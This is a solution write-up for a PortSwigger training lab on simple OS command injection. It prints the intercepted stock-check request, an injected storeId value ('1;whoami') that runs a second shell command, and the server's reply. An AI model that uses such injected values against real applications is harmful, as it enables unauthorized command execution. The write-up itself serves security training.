# Lab: OS command injection, simple case

### Instructions

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user. 

### Solution

Selecting an item and intercepting the "Check stock" request in Burp we find the following POST request being made:

```
POST /product/stock HTTP/2
Host: 0a0700db0498bcf1818c617a009a002f.web-security-academy.net
Cookie: session=y76TAVezeFXYL77u8oSV3gZdcbS4WHvN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0700db0498bcf1818c617a009a002f.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: https://0a0700db0498bcf1818c617a009a002f.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=19&storeId=1
```

Testing the `storeId` parameter, command injection is verified with:

```
POST /product/stock HTTP/2
Host: 0a0700db0498bcf1818c617a009a002f.web-security-academy.net
Cookie: session=y76TAVezeFXYL77u8oSV3gZdcbS4WHvN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0700db0498bcf1818c617a009a002f.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: https://0a0700db0498bcf1818c617a009a002f.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=19&storeId=1;whoami
```

This returns:

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

11
peter-q9D4Ee
```

Which solves the lab.

### Python Solution

See `cmdi_01.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Command_Injection/CMDi_01_os_command_injection_simple_case]
└─$ python cmdi_01.py https://0a26007704ccd08281d8b11800a500a0.web-security-academy.net/
[+] Lab solved
[+] User: peter-1xCW0H
```